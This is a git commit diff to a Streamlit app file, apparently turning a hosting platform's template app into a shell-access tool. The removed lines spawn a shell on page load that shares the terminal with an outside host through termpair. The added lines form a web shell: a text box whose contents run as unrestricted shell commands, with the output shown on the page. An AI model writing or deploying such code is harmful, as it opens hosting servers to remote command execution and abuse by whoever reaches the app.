b14e1f75ceb17c32db5b531d4c012a8d2696c42e
getajet <cloth@duckspam.com>
2024-10-19 22:32:18 +0000

    keke

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,13 +1,33 @@
 import streamlit as st
-import pty
-st.title("🎈 My new app")
-st.write(
-    "Let's start building! For help and inspiration, head over to [docs.streamlit.io](https://docs.streamlit.io/)."
-)
+import subprocess
+import threading
+import queue
 
-import pty
+def run_command(command, output_queue):
+    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
+    for line in process.stdout:
+        output_queue.put(line)
+    for line in process.stderr:
+        output_queue.put(line)
+    process.wait()
 
-def execute_lss():
-    pty.spawn(['/bin/sh', '-c', 'termpair share --host "https://chadsmith.dev/termpair/" --port 443'])
+def stream_console_output(command):
+    st.title('Console Output in Streamlit')
 
-execute_lss()
+    output_queue = queue.Queue()
+    thread = threading.Thread(target=run_command, args=(command, output_queue))
+    thread.start()
+
+    output_lines = []
+
+    while thread.is_alive() or not output_queue.empty():
+        while not output_queue.empty():
+            line = output_queue.get()
+            output_lines.append(line)
+        st.text_area('Console Output', value=''.join(output_lines), height=400)
+        st.experimental_rerun()
+
+if __name__ == "__main__":
+    command = st.text_input('Enter the command to run:', value='echo Hello, Streamlit!')
+    if st.button('Run Command'):
+        stream_console_output(command)
